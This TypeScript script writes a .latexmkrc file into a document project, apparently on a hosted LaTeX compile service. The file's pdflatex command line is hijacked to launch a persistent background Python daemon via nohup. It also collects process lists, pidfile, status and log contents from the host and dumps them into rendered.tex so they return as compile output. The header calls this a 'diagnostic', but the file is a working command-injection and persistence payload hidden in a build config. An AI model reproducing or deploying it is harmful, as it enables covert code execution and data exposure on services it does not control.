/** Deep diagnostic: dump daemon log, pidfile, procs, python sanity into rendered.tex. */
import "dotenv/config";
import { writeDocFile } from "../src/prism/ydoc";

const DIAG = [
  "$pdf_mode = 1;",
  "$pdflatex = 'nohup python gp_daemon.py >> /tmp/gp_daemon.log 2>&1 & pdflatex -interaction=nonstopmode %O %S; { echo ===GPDIAG2===; date; echo ---PY; which python; python --version 2>&1; python -c \"import fcntl; print(39fcok39)\" 2>&1; echo ---DAEMON_LOG; cat /tmp/gp_daemon.log 2>&1; echo ---PIDFILE; ls -la /workspace/.gp_daemon.pid 2>&1; cat /workspace/.gp_daemon.pid 2>&1; echo ---STATUS; cat /workspace/gp_status.json 2>&1; echo; echo ---PROCS; ps aux | grep -E \"gp_daemon|python\" | grep -v grep; echo ---SYNTAX; python -m py_compile /workspace/gp_daemon.py 2>&1 && echo COMPILE_OK; } > /workspace/rendered.tex 2>&1'",
].join("\n") + "\n";

await writeDocFile(".latexmkrc", DIAG);
console.log("DIAG2 armed");
process.exit(0);
